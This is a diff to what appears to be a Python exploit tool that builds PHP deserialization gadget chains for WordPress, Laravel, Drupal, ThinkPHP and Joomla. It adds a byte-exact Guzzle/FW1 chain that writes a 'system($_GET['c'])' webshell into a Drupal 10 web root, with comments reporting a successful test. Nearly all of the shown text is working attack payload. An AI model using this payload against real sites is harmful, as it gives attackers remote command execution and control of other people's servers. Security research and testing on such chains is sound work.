@@ -82,9 +82,9 @@ def set_gadget(name: str, arg: str = "") -> None:
     """Choose the planted record: 'filecache' (lab gadget, writes a
     webshell), a framework gadget that runs arg via system()
     ('wordpress' WP core, 'laravel' PHPGGC Laravel/RCE9, 'drupal'
-    PHPGGC Drupal7/RCE1, 'thinkphp' PHPGGC ThinkPHP/RCE3), or
-    'joomla' (PHPGGC Joomla/FW1 - a file write whose random shell is
-    then probed)."""
+    PHPGGC Drupal7/RCE1, 'thinkphp' PHPGGC ThinkPHP/RCE3), or a file
+    write whose random shell is then probed ('joomla' PHPGGC
+    Joomla/FW1, 'drupal10' PHPGGC Guzzle/FW1 from Drupal's vendor)."""
     global GADGET, WP_ARG
     GADGET, WP_ARG = name, arg
 
@@ -99,6 +99,31 @@ SEP = b":" + b'"'
 
 
 def obj_bytes() -> bytes:
+    if GADGET == "drupal10":
+        # PHPGGC Guzzle/FW1 (4.0.0-rc.2 <= 7.5.0+), byte-identical to
+        # phpggc's output for the same arguments: FileCookieJar's
+        # __destruct json-encodes the cookie (whose Value is our
+        # webshell - single quotes survive JSON untouched) and writes
+        # it to the configured path - this run's random shell in the
+        # docroot. Guzzle ships with Drupal core (measured:
+        # --test-payload SUCCESS against drupal:10.6.17; the Drupal9
+        # chain needs laminas/diactoros, which D10 no longer bundles).
+        path = f"/var/www/html/{SHELL_NAME}".encode()
+        content = b"<?php system($_GET['c']); ?>"
+        return (b'evil|O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:'
+                b'{s:36:"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies";'
+                b'a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:'
+                b'{s:33:"\x00GuzzleHttp\\Cookie\\SetCookie\x00data";'
+                b'a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;'
+                b's:5:"Value";s:'
+                + str(len(content)).encode() + SEP + content
+                + b'";}}}'
+                b's:39:"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode";N;'
+                b's:41:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename";s:'
+                + str(len(path)).encode() + SEP + path
+                + b'";'
+                b's:52:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00'
+                b'storeSessionCookies";b:1;}')
     if GADGET == "thinkphp":
         # PHPGGC ThinkPHP/RCE3 (-6.0.1+; measured on ThinkPHP 6.1.5
         # with --test-payload), byte-identical to phpggc's output for
